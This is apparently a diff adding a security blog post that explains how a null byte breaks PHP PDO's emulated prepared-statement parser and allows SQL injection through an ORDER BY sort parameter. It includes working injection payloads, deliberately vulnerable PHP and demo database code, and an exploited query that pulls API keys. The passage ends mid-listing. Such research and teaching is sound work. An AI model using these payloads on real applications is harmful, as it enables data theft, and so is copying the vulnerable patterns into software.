@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/net0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=net0.github.io/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Breaking PDO: When Prepared Statements Aren&#39;t Enough | Net0</title>
+<meta name="keywords" content="sql-injection, php, pdo, web-security">
+<meta name="description" content="A novel SQL injection technique that bypasses PDO prepared statements using null byte parser exploitation">
+<meta name="author" content="net0">
+<link rel="canonical" href="http://localhost:1313/net0.github.io/writeups/pdo-sql-injection/">
+<link crossorigin="anonymous" href="/net0.github.io/assets/css/stylesheet.9aea0b801c8a7c4b49d0639626944a0e2a4c7f4223e5cf17109963503d41bf28.css" integrity="sha256-muoLgByKfEtJ0GOWJpRKDipMf0Ij5c8XEJljUD1Bvyg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/net0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/net0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/net0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/net0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/net0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/net0.github.io/writeups/pdo-sql-injection/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/net0.github.io/" accesskey="h" title="Net0 (Alt + H)">Net0</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/net0.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/net0.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/net0.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/net0.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Breaking PDO: When Prepared Statements Aren&#39;t Enough
+    </h1>
+    <div class="post-description">
+      A novel SQL injection technique that bypasses PDO prepared statements using null byte parser exploitation
+    </div>
+    <div class="post-meta"><span title='2025-11-30 00:00:00 +0000 UTC'>November 30, 2025</span>&nbsp;·&nbsp;<span>11 min</span>&nbsp;·&nbsp;<span>net0</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h3 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h3>
+<p>Prepared statements are considered the gold standard for preventing SQL injection. Every security guide, every OWASP recommendation, every senior developer will tell you: &ldquo;Use prepared statements and you&rsquo;re safe.&rdquo;
+But what if I told you that even properly implemented prepared statements can be bypassed?</p>
+<p>In this post, I&rsquo;ll walk you through a technique that exploits PHP&rsquo;s PDO library specifically how it handles emulated prepared statements. You&rsquo;ll learn how a simple sorting parameter, combined with a null byte, can turn &ldquo;secure&rdquo; code into a full database compromise.</p>
+<p>We&rsquo;ll build a vulnerable application together, exploit it step by step, and understand exactly why this works under the hood.</p>
+<h3 id="sql-injection-a-quick-refresher">SQL Injection: A quick refresher<a hidden class="anchor" aria-hidden="true" href="#sql-injection-a-quick-refresher">#</a></h3>
+<p>Before we dive into the bypass technique, let&rsquo;s quickly recap how traditional SQL injection works.</p>
+<p>Consider this PHP code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f85149">$</span>username<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#f85149">$</span>_GET[<span style="color:#a5d6ff">&#39;username&#39;</span>];<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#f85149">$</span>password<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#f85149">$</span>_GET[<span style="color:#a5d6ff">&#39;password&#39;</span>];<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#f85149">$</span>query<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">&#34;SELECT * FROM users WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;&#34;</span>;<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#f85149">$</span><span style="color:#ff7b72">result</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span>mysqli_query(<span style="color:#f85149">$</span>conn,<span style="color:#6e7681"> </span><span style="color:#f85149">$</span>query);<span style="color:#6e7681">
+</span></span></span></code></pre></div><p>The problem is obvious - user input is concatenated directly into the SQL query. When a user submits:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>username:<span style="color:#6e7681"> </span><span style="color:#ff7b72">admin</span><span style="color:#a5d6ff">&#39; OR 1=1-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">password: anything
+</span></span></span></code></pre></div><p>The query becomes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff7b72">SELECT</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">FROM</span><span style="color:#6e7681"> </span>users<span style="color:#6e7681"> </span><span style="color:#ff7b72">WHERE</span><span style="color:#6e7681"> </span>username<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">&#39;admin&#39;</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">OR</span><span style="color:#6e7681"> </span><span style="color:#a5d6ff">1</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">1</span><span style="color:#8b949e;font-style:italic">-- -&#39; AND password = &#39;anything&#39;
+</span></span></span></code></pre></div><p>The single quote closes the string, <code>OR 1=1</code> makes the condition always true, and <code>-- -</code> comments out the rest. The attacker bypasses authentication.</p>
+<p>This is SQL injection 101. The fix? Prepared statements.</p>
+<h3 id="prepared-statements-the-secure-solution">Prepared Statements: The “Secure” Solution<a hidden class="anchor" aria-hidden="true" href="#prepared-statements-the-secure-solution">#</a></h3>
+<p>Prepared statements solve the injection problem by separating SQL structure from user data.
+Instead of concatenating input directly, we use placeholders:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f85149">$</span>username<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#f85149">$</span>_GET[<span style="color:#a5d6ff">&#39;username&#39;</span>];<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#f85149">$</span>password<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#f85149">$</span>_GET[<span style="color:#a5d6ff">&#39;password&#39;</span>];<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#f85149">$</span>stmt<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#f85149">$</span>pdo<span style="color:#ff7b72;font-weight:bold">-&gt;</span><span style="color:#ff7b72">prepare</span>(<span style="color:#a5d6ff">&#34;SELECT * FROM users WHERE username = ? AND password = ?&#34;</span>);<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#f85149">$</span>stmt<span style="color:#ff7b72;font-weight:bold">-&gt;</span><span style="color:#ff7b72">execute</span>([<span style="color:#f85149">$</span>username,<span style="color:#6e7681"> </span><span style="color:#f85149">$</span>password]);<span style="color:#6e7681">
+</span></span></span></code></pre></div><p>The <code>?</code> markers are placeholders. The database receives two things separately:</p>
+<ol>
+<li>The query structure (with <code>?</code> markers)</li>
+<li>The user input values</li>
+</ol>
+<p>When the database processes this, it says: &ldquo;Whatever values you give me go into those <code>?</code> spots, but I&rsquo;ll treat them as data never as SQL code.&rdquo;</p>
+<p>So if an attacker tries the same payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>username:<span style="color:#6e7681"> </span><span style="color:#ff7b72">admin</span><span style="color:#a5d6ff">&#39; OR 1=1-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">password: anything
+</span></span></span></code></pre></div><p>The database simply searches for a user literally named <code>admin' OR 1=1-- -</code>. The injection fails because the input never becomes part of the SQL structure.</p>
+<p>This is why every security guide recommends prepared statements. They work. They&rsquo;re safe.</p>
+<p>Or are they?</p>
+<hr>
+<h3 id="the-limitation-what-cant-be-a-placeholder">The Limitation. What can’t be a placeholder?<a hidden class="anchor" aria-hidden="true" href="#the-limitation-what-cant-be-a-placeholder">#</a></h3>
+<p>Prepared statements work perfectly for values usernames, passwords, IDs, search terms. But SQL queries have other components that can&rsquo;t be parameterized.</p>
+<p>Consider this scenario: you&rsquo;re building a dashboard that displays vulnerability scan results. Users want to sort findings by different columns  severity, hostname, port, CVSS score.</p>
+<p>You might try this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$sort</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">$_GET</span>[<span style="color:#a5d6ff">&#39;sort&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$stmt</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">$pdo</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>prepare(<span style="color:#a5d6ff">&#34;SELECT * FROM findings WHERE scan_id = ? ORDER BY ?&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$stmt</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>execute([<span style="color:#79c0ff">$scan_id</span>, <span style="color:#79c0ff">$sort</span>]);
+</span></span></code></pre></div><p>This won&rsquo;t work. Why?</p>
+<p>The <code>ORDER BY</code> clause expects a column name, not a string value. If the placeholder became <code>'severity'</code> (with quotes), MySQL would throw an error. Column names, table names, and other SQL identifiers cannot be bound as parameters.</p>
+<p>So developers are forced to insert these values directly into the query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$sort</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">$_GET</span>[<span style="color:#a5d6ff">&#39;sort&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$stmt</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">$pdo</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>prepare(<span style="color:#a5d6ff">&#34;SELECT * FROM findings WHERE scan_id = ? ORDER BY `</span><span style="color:#a5d6ff">$sort</span><span style="color:#a5d6ff">`&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$stmt</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>execute([<span style="color:#79c0ff">$scan_id</span>]);
+</span></span></code></pre></div><p>The backticks (```) tell MySQL this is a column identifier. Many developers also escape backticks within the input:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$sort</span> <span style="color:#ff7b72;font-weight:bold">=</span> str_replace(<span style="color:#a5d6ff">&#39;`&#39;</span>, <span style="color:#a5d6ff">&#39;``&#39;</span>, <span style="color:#79c0ff">$_GET</span>[<span style="color:#a5d6ff">&#39;sort&#39;</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$stmt</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">$pdo</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>prepare(<span style="color:#a5d6ff">&#34;SELECT * FROM findings WHERE scan_id = ? ORDER BY `</span><span style="color:#a5d6ff">$sort</span><span style="color:#a5d6ff">`&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$stmt</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>execute([<span style="color:#79c0ff">$scan_id</span>]);
+</span></span></code></pre></div><p>This looks safe. The <code>scan_id</code> uses a proper placeholder. The <code>sort</code> column is wrapped in backticks and escaped. What could go wrong?</p>
+<p>Everything. And here’s why.</p>
+<hr>
+<h3 id="pdos-internal-parser---how-it-works">PDO’s Internal Parser - How it works.<a hidden class="anchor" aria-hidden="true" href="#pdos-internal-parser---how-it-works">#</a></h3>
+<p>Here&rsquo;s something that surprises many developers: PDO doesn&rsquo;t always use real prepared statements.</p>
+<p>By default, when connecting to MySQL, PDO uses <strong>emulated prepared statements</strong>. This means PDO doesn&rsquo;t send your query and parameters separately to the database. Instead, PDO itself parses the query, finds the <code>?</code> placeholders, escapes your values, and substitutes them in - all before the query reaches MySQL.</p>
+<p>Why does this matter? Because PDO needs to <strong>parse your SQL</strong> to find those placeholders.</p>
+<p>Think about this query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff7b72">SELECT</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">FROM</span><span style="color:#6e7681"> </span>users<span style="color:#6e7681"> </span><span style="color:#ff7b72">WHERE</span><span style="color:#6e7681"> </span>name<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">?</span><span style="color:#6e7681"> </span><span style="color:#8b949e;font-style:italic">/* TODO: fix this ? */</span><span style="color:#6e7681">
+</span></span></span></code></pre></div><p>There are two <code>?</code> characters, but only one is a real placeholder. The other is inside a comment. PDO needs to understand SQL syntax to tell the difference.</p>
+<p>So PDO implements its own SQL parser. This parser recognizes:</p>
+<ul>
+<li>Strings in single quotes (<code>'...'</code>)</li>
+<li>Strings in double quotes (<code>&quot;...&quot;</code>)</li>
+<li>Identifiers in backticks (<code>...</code>)</li>
+<li>Comments (<code>- ...</code> and <code>/* ... */</code>)</li>
+</ul>
+<p>When PDO sees a <code>?</code> inside any of these, it knows: &ldquo;That&rsquo;s not a real placeholder, skip it.&rdquo;</p>
+<p>The parser processes characters from <code>\x01</code> to <code>\xff</code> as valid input. It reads through your query, tracking whether it&rsquo;s inside a string, identifier, or comment.</p>
+<p>But what happens when the parser encounters something outside that range?</p>
+<p>What happens when it hits a null byte - <code>\x00</code>?</p>
+<p>It breaks.</p>
+<h3 id="the-null-byte-trick---breaking-the-parser">The Null Byte Trick - Breaking the parser<a hidden class="anchor" aria-hidden="true" href="#the-null-byte-trick---breaking-the-parser">#</a></h3>
+<p>When PDO&rsquo;s parser hits a null byte (<code>\x00</code> or <code>%00</code> in URL encoding), it doesn&rsquo;t know how to handle it. The parser expects characters in the <code>\x01</code> to <code>\xff</code> range. A null byte is outside that range.
+The result? The parser breaks and stops tracking its current state.
+Let&rsquo;s see this in action. Consider our vulnerable query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f85149">$</span>sort<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span>str_replace(<span style="color:#a5d6ff">&#39;`&#39;</span>,<span style="color:#6e7681"> </span><span style="color:#a5d6ff">&#39;``&#39;</span>,<span style="color:#6e7681"> </span><span style="color:#f85149">$</span>_GET[<span style="color:#a5d6ff">&#39;sort&#39;</span>]);<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#f85149">$</span>stmt<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#f85149">$</span>pdo<span style="color:#ff7b72;font-weight:bold">-&gt;</span><span style="color:#ff7b72">prepare</span>(<span style="color:#a5d6ff">&#34;SELECT * FROM findings WHERE scan_id = ? ORDER BY `$sort`&#34;</span>);<span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#f85149">$</span>stmt<span style="color:#ff7b72;font-weight:bold">-&gt;</span><span style="color:#ff7b72">execute</span>([<span style="color:#f85149">$</span>scan_id]);<span style="color:#6e7681">
+</span></span></span></code></pre></div><p>Normally, if we inject a <code>?</code> into the sort parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sort<span style="color:#ff7b72;font-weight:bold">=?</span><span style="color:#6e7681">
+</span></span></span></code></pre></div><p>PDO sees:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff7b72">SELECT</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">FROM</span><span style="color:#6e7681"> </span>findings<span style="color:#6e7681"> </span><span style="color:#ff7b72">WHERE</span><span style="color:#6e7681"> </span>scan_id<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">?</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">ORDER</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">BY</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`?`</span><span style="color:#6e7681">
+</span></span></span></code></pre></div><p>The parser recognizes that the second <code>?</code> is inside backticks - it&rsquo;s part of an identifier, not a real placeholder. Our injection fails.</p>
+<p>But what if we add a null byte?</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sort<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#f85149">\</span><span style="color:#ff7b72;font-weight:bold">?</span>;<span style="color:#8b949e;font-style:italic">-- %00
+</span></span></span></code></pre></div><p>Now PDO tries to parse:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff7b72">SELECT</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">FROM</span><span style="color:#6e7681"> </span>findings<span style="color:#6e7681"> </span><span style="color:#ff7b72">WHERE</span><span style="color:#6e7681"> </span>scan_id<span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">?</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">ORDER</span><span style="color:#6e7681"> </span><span style="color:#ff7b72">BY</span><span style="color:#6e7681"> </span><span style="color:#ff7b72;font-weight:bold">`</span><span style="color:#f85149">\</span><span style="color:#ff7b72;font-weight:bold">?</span>;<span style="color:#8b949e;font-style:italic">-- [NULL]`
+</span></span></span></code></pre></div><p>The parser starts reading the backtick-quoted identifier. Then it hits the null byte. It breaks. It stops recognizing the backticks.</p>
+<p>Suddenly, PDO sees that <code>?</code> as a <strong>real placeholder</strong>.</p>
+<h2 id="the-swap">The Swap<a hidden class="anchor" aria-hidden="true" href="#the-swap">#</a></h2>
+<p>Now we have two <code>?</code> markers in the query:</p>
+<ol>
+<li>The original one: <code>WHERE scan_id = ?</code></li>
+<li>Our injected one: <code>ORDER BY \?</code></li>
+</ol>
+<p>But wait - the <code>--</code>  in our payload is a SQL comment. From PDO&rsquo;s perspective, it comments out the original <code>?</code>.</p>
+<p>PDO now sees only ONE placeholder - our fake one.</p>
+<p>When we call <code>execute([$scan_id])</code>, PDO takes the <code>scan_id</code> value and substitutes it into&hellip; our injected <code>?</code> in the ORDER BY clause.</p>
+<p>The value we put in <code>scan_id</code> is no longer just a scan ID. It&rsquo;s now <strong>executable SQL code</strong> being inserted into the ORDER BY position.</p>
+<table>
+  <thead>
+      <tr>
+          <th><strong>What we send</strong></th>
+          <th><strong>Where it ends up</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>scan_id=PAYLOAD</code></td>
+          <td>Gets substituted into ORDER BY (our fake <code>?)</code></td>
+      </tr>
+      <tr>
+          <td><code>sort=\?;-- %00</code></td>
+          <td>Creates the fake <code>?</code> and comments out the original</td>
+      </tr>
+  </tbody>
+</table>
+<p>The &ldquo;safe&rdquo; parameter becomes our injection point.</p>
+<hr>
+<h3 id="practical-demonstration---vulnscan-dashboard">Practical Demonstration - VulnScan dashboard<a hidden class="anchor" aria-hidden="true" href="#practical-demonstration---vulnscan-dashboard">#</a></h3>
+<p><strong>The Database</strong></p>
+<h3 id="scenario">Scenario<a hidden class="anchor" aria-hidden="true" href="#scenario">#</a></h3>
+<p>Imagine you&rsquo;re using a vulnerability scanner like Nessus or OpenVAS. It has a web dashboard where you view scan results.</p>
+<p><strong>The Tables</strong></p>
+<p><strong><code>findings</code> -</strong> Stores vulnerabilities scan results</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>| id | hostname     | port | severity | title              |
+</span></span><span style="display:flex;"><span>|----|--------------|------|----------|--------------------|
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">1</span>  | 192.168.1.10 | <span style="color:#a5d6ff">22</span>   | Medium   | SSH Weak Ciphers   |
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">2</span>  | 192.168.1.10 | <span style="color:#a5d6ff">80</span>   | High     | SQL Injection      |
+</span></span></code></pre></div><p>This is what users are <strong>supposed</strong> to see.</p>
+<p><strong><code>api_keys</code></strong> - Stores sensitive API keys for integrations</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>| id | key_name           | api_key                              |
+</span></span><span style="display:flex;"><span>|----|--------------------|--------------------------------------|
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">1</span>  | Production API     | prod_api_a3f8b2c1d4e5f6a7b8c9d0e1f2.. |
+</span></span></code></pre></div><p>This is what users should <strong>never</strong> see.</p>
+<h2 id="the-attack-goal">The Attack Goal<a hidden class="anchor" aria-hidden="true" href="#the-attack-goal">#</a></h2>
+<p>The application only shows data from <code>findings</code>. Users can sort by severity, hostname, port, etc.</p>
+<p>Through our SQLi, we trick the application into reading from <code>api_keys</code> instead - a table we&rsquo;re not supposed to access.</p>
+<p><strong>Normal query:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SELECT severity FROM findings WHERE <span style="color:#79c0ff">scan_id</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">1</span>
+</span></span></code></pre></div><p><strong>Our exploited query:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SELECT <span style="color:#a5d6ff">`</span><span style="color:#79c0ff">\&#39;</span>x<span style="color:#a5d6ff">`</span> FROM <span style="color:#ff7b72;font-weight:bold">(</span>SELECT api_key AS <span style="color:#a5d6ff">`</span><span style="color:#79c0ff">\&#39;</span>x<span style="color:#a5d6ff">`</span> FROM api_keys<span style="color:#ff7b72;font-weight:bold">)</span>y;-- ...
+</span></span></code></pre></div><p>We replaced the entire query to read from a different table.</p>
+<details>
+<summary> View the database code</summary>
+<pre><code>CREATE DATABASE vulnscan;
+USE vulnscan;
+
+CREATE TABLE findings (
+    id INT PRIMARY KEY AUTO_INCREMENT,
+    hostname VARCHAR(100),
+    port INT,
+    severity VARCHAR(20),
+    cvss DECIMAL(3,1),
+    title VARCHAR(200),
+    description TEXT,
+    scan_id INT
+);
+
+CREATE TABLE scans (
+    id INT PRIMARY KEY AUTO_INCREMENT,
+    scan_name VARCHAR(100),
+    target VARCHAR(100),
+    scan_date DATETIME
+);
+
+CREATE TABLE api_keys (
+    id INT PRIMARY KEY AUTO_INCREMENT,
+    key_name VARCHAR(50),
+    api_key VARCHAR(255),
+    created_by VARCHAR(50)
+);
+
+INSERT INTO findings VALUES 
+(1, '192.168.1.10', 22, 'Medium', 5.3, 'SSH Weak Ciphers', 'Server supports weak ciphers', 1),
+(2, '192.168.1.10', 80, 'High', 7.5, 'SQL Injection', 'Parameter vulnerable to SQLi', 1),
